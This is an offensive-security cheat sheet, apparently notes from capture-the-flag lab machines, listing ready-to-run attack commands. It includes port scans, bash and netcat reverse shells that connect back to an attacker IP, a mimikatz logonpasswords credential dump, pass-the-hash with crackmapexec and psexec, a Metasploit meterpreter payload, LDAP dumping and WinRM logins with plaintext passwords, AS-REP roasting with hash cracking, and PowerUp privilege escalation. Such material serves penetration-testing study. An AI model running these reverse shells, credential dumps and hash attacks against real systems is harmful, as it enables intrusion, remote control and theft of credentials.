### nmap ###
  # basic
  sudo nmap -sS -sV -O -p - <IP>

  # standard output
  sudo nmap -oN res.out -sS -sV -O -p - <IP>

  # metasploit output
  sudo nmap -oX res.xml -sS -sV -O -p - <IP>

  # ping scan 
  sudo nmap -Pn -sS -sV -O -p - <IP>
  

### Shell from command execution ###

  # netcat linux
  nc -lnvp <PORT>
  bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

  # netcat windows
    # Download netcat exe for windows  
    wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
    # upload the exe on the target 
    lcd /home/kali/Downloads/netcat-1.11
    upload nc.exe
    # create a listener on the attacker machine
    nc -nlvp 1234 
    # Create reverse shell by connecting from the target
    execute -f nc.exe -a "-e cmd.exe 10.10.14.184 1234"
  
### smbclient ###

  # No password (anonymous)
  smbclient -N  \\\\<IP>\\backups

  # Command
  dir = list directory
  get = retrieve file

### mimikatz ###
  # command line
  .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

### crackmapexec ###

  # Anonymous shares
  crackmapexec smb <IP> -u 'a' -p '' --shares

  # hashes 
  crackmapexec smb <IP> -H 'HASH:HASH' 


### psexec ###

  # Metasploit 
  use exploit/windows/smb/psexec
  set payload windows/meterpreter/reverse_tcp
  Only works sometimes if the hash if given with following format:
    00000000000000000000000000000000:8a4b77d52b1845bfe949ed1b9643bb18
	
  # basic
  psexec.py Domain/user:password@192.168.1.2

  # hash
  psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2 cmd.exe


### LDAP ###
  # Dump with an account 
  ldapdomaindump pathfinder -u 'MEGACORP\svc_bes' -p 'Sheffield19' --authtype SIMPLE --no-json --no-grep


### Win RM ###
  # evil_winrm
  evil-winrm -i 192.168.1.105 -u administrator -p 'Ignite@987'

### Kerberos ###
  # AS-REP Roasting
    # get TGT 
    GetNPUsers.py megacorp/svc_bes -request -format john -no-pass -dc-ip 10.10.10.30 -outputfile ./hashes.txt
    # crack
    john hashes.txt -wordlist=/usr/share/wordlists/rockyou.txt

### Powershell / post exploitation ###

  # domain info
  Get-ADDomain

  # SPN info
  setspn -T MEGACORP -F -Q */*

### find ###

  # all file accessible by a group
  find / -type f -group <GROUP> 2>/dev/null

  # find file with a name (regex)
  find . -type f -regex '*flag*'

### john ###
   # john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  


### Privesc Windows ###
  
  # PowerUp
  Import-Module PowerUp.ps1
  Invoke-AllChecks 




